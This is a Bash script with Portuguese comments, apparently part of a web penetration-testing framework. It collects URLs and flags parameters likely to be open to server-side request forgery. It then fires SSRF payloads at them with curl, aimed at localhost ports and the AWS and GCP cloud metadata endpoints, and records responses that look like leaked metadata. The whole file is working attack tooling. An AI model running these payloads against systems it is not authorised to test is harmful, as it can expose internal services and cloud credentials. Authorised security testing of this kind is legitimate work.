#!/bin/bash

# SSRF preflight
# Identifica parâmetros suspeitos: url, redirect, next
# Testa: esquemas, IP internos, metadata cloud

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FRAMEWORK_DIR="$(dirname "$SCRIPT_DIR")"
PARAMS_FILE="$FRAMEWORK_DIR/output/params/parameters.txt"
URLS_FILE="$FRAMEWORK_DIR/output/params/all_urls.txt"
OUTPUT_DIR="$FRAMEWORK_DIR/output/ssrf"
SUSPICIOUS_PARAMS="$OUTPUT_DIR/suspicious_params.txt"
VULNERABLE_FILE="$OUTPUT_DIR/vulnerable.txt"
TEST_RESULTS="$OUTPUT_DIR/test_results.txt"

# Cores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${GREEN}[+] Iniciando SSRF preflight${NC}"

# Criar diretório de output
mkdir -p "$OUTPUT_DIR"

# Limpar arquivos anteriores
> "$SUSPICIOUS_PARAMS"
> "$VULNERABLE_FILE"
> "$TEST_RESULTS"

# Parâmetros suspeitos para SSRF
SUSPICIOUS_PARAM_NAMES=(
    "url"
    "redirect"
    "next"
    "target"
    "destination"
    "link"
    "uri"
    "path"
    "file"
    "page"
    "host"
    "server"
    "proxy"
    "api"
    "endpoint"
    "callback"
    "return"
    "return_to"
    "returnUrl"
    "redirect_uri"
    "redirect_url"
    "callback_url"
    "webhook"
    "fetch"
    "load"
    "request"
    "req"
)

# IPs internos para teste
INTERNAL_IPS=(
    "127.0.0.1"
    "localhost"
    "0.0.0.0"
    "169.254.169.254"  # AWS metadata
    "metadata.google.internal"  # GCP metadata
    "169.254.169.254"  # Azure metadata
)

# URLs de teste para SSRF
TEST_URLS=(
    "http://127.0.0.1:80"
    "http://127.0.0.1:8080"
    "http://127.0.0.1:3000"
    "http://localhost"
    "http://169.254.169.254/latest/meta-data/"  # AWS
    "http://metadata.google.internal/computeMetadata/v1/"  # GCP
)

echo -e "${BLUE}[*] Identificando parâmetros suspeitos...${NC}"

# Verificar arquivo de entrada
INPUT_FILE="$URLS_FILE"
if [ ! -f "$INPUT_FILE" ] || [ ! -s "$INPUT_FILE" ]; then
    INPUT_FILE="$PARAMS_FILE"
fi

if [ ! -f "$INPUT_FILE" ]; then
    echo -e "${RED}[-] Arquivos de parâmetros não encontrados!${NC}"
    echo -e "${YELLOW}[*] Execute primeiro: ./recon/params.sh${NC}"
    exit 1
fi

# Identificar parâmetros suspeitos
while IFS= read -r line; do
    if [ -z "$line" ]; then
        continue
    fi
    
    # Se for URL, extrair parâmetros
    if echo "$line" | grep -q "?"; then
        url="$line"
        if [[ ! "$url" =~ ^https?:// ]]; then
            url="http://$url"
        fi
        
        base_url=$(echo "$url" | cut -d'?' -f1)
        params=$(echo "$url" | cut -d'?' -f2- | cut -d'#' -f1)
        
        IFS='&' read -ra PARAM_ARRAY <<< "$params"
        for param_pair in "${PARAM_ARRAY[@]}"; do
            param_name=$(echo "$param_pair" | cut -d'=' -f1 | tr '[:upper:]' '[:lower:]')
            
            for suspicious in "${SUSPICIOUS_PARAM_NAMES[@]}"; do
                if echo "$param_name" | grep -qi "$suspicious"; then
                    echo "$base_url|$param_name" >> "$SUSPICIOUS_PARAMS"
                    echo -e "${YELLOW}[!] Parâmetro suspeito: $param_name em $base_url${NC}"
                    break
                fi
            done
        done
    # Se for apenas nome de parâmetro
    else
        param_name=$(echo "$line" | tr '[:upper:]' '[:lower:]')
        for suspicious in "${SUSPICIOUS_PARAM_NAMES[@]}"; do
            if echo "$param_name" | grep -qi "$suspicious"; then
                echo "$param_name" >> "$SUSPICIOUS_PARAMS"
                break
            fi
        done
    fi
done < "$INPUT_FILE"

# Remover duplicatas
sort -u "$SUSPICIOUS_PARAMS" -o "$SUSPICIOUS_PARAMS"

SUSP_COUNT=$(wc -l < "$SUSPICIOUS_PARAMS" 2>/dev/null || echo "0")
echo -e "${GREEN}[+] Parâmetros suspeitos encontrados: $SUSP_COUNT${NC}"

# Testar SSRF nos parâmetros suspeitos
if [ "$SUSP_COUNT" -gt 0 ]; then
    echo -e "${BLUE}[*] Testando SSRF...${NC}"
    
    # Processar primeiras 20 URLs suspeitas
    head -20 "$SUSPICIOUS_PARAMS" | while IFS='|' read -r base_url param_name; do
        if [ -z "$base_url" ] || [ -z "$param_name" ]; then
            continue
        fi
        
        # Adicionar protocolo se necessário
        if [[ ! "$base_url" =~ ^https?:// ]]; then
            base_url="http://$base_url"
        fi
        
        echo -e "${BLUE}[*] Testando: $base_url?$param_name${NC}"
        
        # Testar cada URL de teste
        for test_url in "${TEST_URLS[@]}"; do
            # Testar com diferentes esquemas
            test_payloads=(
                "$test_url"
                "//$test_url"
                "http://$test_url"
                "https://$test_url"
            )
            
            for payload in "${test_payloads[@]}"; do
                # Codificar URL
                encoded_payload=$(echo "$payload" | sed 's|/|%2F|g' | sed 's|:|%3A|g')
                
                ssrf_url="${base_url}?${param_name}=${encoded_payload}"
                
                # Fazer requisição e verificar resposta
                response=$(curl -s -w "\n%{http_code}\n%{time_total}" \
                    --max-time 10 \
                    --connect-timeout 5 \
                    "$ssrf_url" 2>/dev/null || echo -e "\n000\n0")
                
                http_code=$(echo "$response" | tail -2 | head -1)
                time_total=$(echo "$response" | tail -1)
                
                # Verificar indicadores de SSRF
                response_body=$(echo "$response" | head -n -2)
                
                # Verificar se há resposta de metadata ou localhost
                if echo "$response_body" | grep -qiE "instance-id|ami-id|local-hostname|169.254.169.254|metadata"; then
                    echo -e "${RED}[+] SSRF possível: $ssrf_url${NC}"
                    echo "$ssrf_url|$http_code|metadata_response" >> "$VULNERABLE_FILE"
                fi
                
                # Verificar tempo de resposta (pode indicar conexão interna)
                # Converter para número e comparar
                if [ -n "$time_total" ] && [ "$(echo "$time_total > 5" | bc 2>/dev/null || echo "0")" = "1" ]; then
                    echo "$ssrf_url|$http_code|slow_response" >> "$TEST_RESULTS"
                fi
                
                # Verificar diferença entre requisições
                if [ "$http_code" != "000" ] && [ "$http_code" != "404" ]; then
                    echo "$ssrf_url|$http_code|$time_total" >> "$TEST_RESULTS"
                fi
            done
        done
    done
fi

# Remover duplicatas
sort -u "$VULNERABLE_FILE" -o "$VULNERABLE_FILE"
sort -u "$TEST_RESULTS" -o "$TEST_RESULTS"

VULN_COUNT=$(wc -l < "$VULNERABLE_FILE" 2>/dev/null || echo "0")
TEST_COUNT=$(wc -l < "$TEST_RESULTS" 2>/dev/null || echo "0")

echo -e "${GREEN}[+] SSRF preflight concluído!${NC}"
echo -e "${GREEN}[+] Estatísticas:${NC}"
echo -e "  - Parâmetros suspeitos: $SUSP_COUNT"
echo -e "  - Testes realizados: $TEST_COUNT"
echo -e "  - Possíveis SSRF: $VULN_COUNT"
echo -e "${GREEN}[+] Arquivos gerados em: $OUTPUT_DIR${NC}"

if [ "$VULN_COUNT" -gt 0 ]; then
    echo -e "${RED}[!] ATENÇÃO: Possíveis vulnerabilidades SSRF encontradas!${NC}"
fi
